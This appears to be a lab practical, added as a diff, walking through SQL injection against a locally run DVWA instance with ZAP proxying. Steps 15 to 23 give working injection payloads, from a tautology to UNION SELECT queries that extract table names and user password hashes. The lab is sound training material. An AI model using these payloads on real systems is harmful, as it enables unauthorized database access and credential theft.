@@ -1,0 +1,227 @@
+============================================================
+PRACTICAL — SQL INJECTION USING DVWA
+============================================================
+
+STEP 1 — Open Terminal
+- Start Kali Linux VM
+- Open Terminal
+
+------------------------------------------------------------
+
+STEP 2 — Update Packages
+
+sudo apt update
+
+------------------------------------------------------------
+
+STEP 3 — Install Docker
+
+sudo apt install -y docker.io
+
+------------------------------------------------------------
+
+STEP 4 — Start Docker
+
+sudo systemctl start docker
+
+------------------------------------------------------------
+
+STEP 5 — Run DVWA
+
+sudo docker run -d -p 8080:80 vulnerables/web-dvwa
+
+------------------------------------------------------------
+
+STEP 6 — Install ZAP
+
+sudo apt install -y zaproxy
+
+------------------------------------------------------------
+
+STEP 7 — Launch ZAP
+
+zaproxy &
+
+------------------------------------------------------------
+
+STEP 8 — Configure ZAP
+- Select:
+  "No, I do not want to persist this session"
+- Click Start
+- If port 8080 conflict appears:
+  Click YES for port 8081
+- Verify:
+  Main Proxy: localhost:8081
+
+------------------------------------------------------------
+
+STEP 9 — Open DVWA Through ZAP
+- Click Manual Explore
+- Enter:
+
+http://localhost:8080
+
+- Click Launch Browser
+
+------------------------------------------------------------
+
+STEP 10 — Login to DVWA
+
+Username:
+admin
+
+Password:
+password
+
+------------------------------------------------------------
+
+STEP 11 — Create Database
+- Click:
+  Create / Reset Database
+- Login again:
+  admin / password
+
+------------------------------------------------------------
+
+STEP 12 — Set Security Level
+- Click:
+  DVWA Security
+- Select:
+  Low
+- Click Submit
+
+------------------------------------------------------------
+
+STEP 13 — Open SQL Injection Page
+- Click:
+  SQL Injection
+
+------------------------------------------------------------
+
+STEP 14 — Normal Input Test
+
+1
+
+- Click Submit
+- Verify user details shown
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 15 — Confirm Vulnerability
+
+'
+
+- Click Submit
+- Verify SQL syntax error
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 16 — Dump All Users
+
+1' OR '1'='1
+
+- Click Submit
+- Verify all users displayed
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 17 — Find Column Count
+
+1' ORDER BY 1#
+
+1' ORDER BY 2#
+
+1' ORDER BY 3#
+
+- Error on 3 means:
+  2 columns exist
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 18 — UNION Test
+
+' UNION SELECT 1,2#
+
+- Click Submit
+- Verify 1 and 2 displayed
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 19 — Get Database Name
+
+' UNION SELECT database(),2#
+
+- Verify:
+  dvwa
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 20 — List Tables
+
+' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#
+
+- Verify:
+  guestbook
+  users
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 21 — List Columns
+
+' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'#
+
+- Verify columns displayed
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 22 — Dump Usernames & Password Hashes
+
+' UNION SELECT user,password FROM users#
+
+- Verify usernames and MD5 hashes displayed
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 23 — Display Combined Credentials
+
+' UNION SELECT user,CONCAT(user,0x3a,password) FROM users#
+
+- Verify:
+  username:passwordhash format
+- Take Screenshot
+
+------------------------------------------------------------
+
+STEP 24 — Verify in ZAP
+- Open ZAP
+- Go to History tab
+- Open SQL Injection request
+- Check:
+  Request tab
+  Response tab
+- Take Screenshot
+
+============================================================
+RESULT
+============================================================
+
+1. DVWA deployed successfully
+2. ZAP proxy configured successfully
+3. SQL Injection vulnerability confirmed
+4. Database name extracted
+5. Tables and columns extracted
+6. Usernames and MD5 hashes dumped
+7. All requests captured in ZAP
+
+============================================================
+END
+============================================================
